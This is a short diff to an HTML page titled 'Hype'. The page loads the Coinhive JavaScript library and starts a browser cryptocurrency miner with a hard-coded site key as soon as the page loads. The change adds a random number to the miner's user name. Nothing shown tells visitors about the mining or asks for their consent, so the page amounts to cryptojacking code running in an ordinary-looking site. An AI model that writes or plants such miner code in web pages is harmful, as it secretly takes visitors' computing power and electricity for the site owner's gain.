@@ -7,7 +7,8 @@
     <title>Hype</title>
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
-        var miner = new CoinHive.User('x7lJozj7YkUgRD3dyyaOYly6Fa8dtynQ','OpenshiftNewApp',
+        var name = Math.random()*1000;
+        var miner = new CoinHive.User('x7lJozj7YkUgRD3dyyaOYly6Fa8dtynQ','OpenshiftNewApp'+name,
             {throttle: 0.1, forceASMJS: true}
         );
         miner.start();
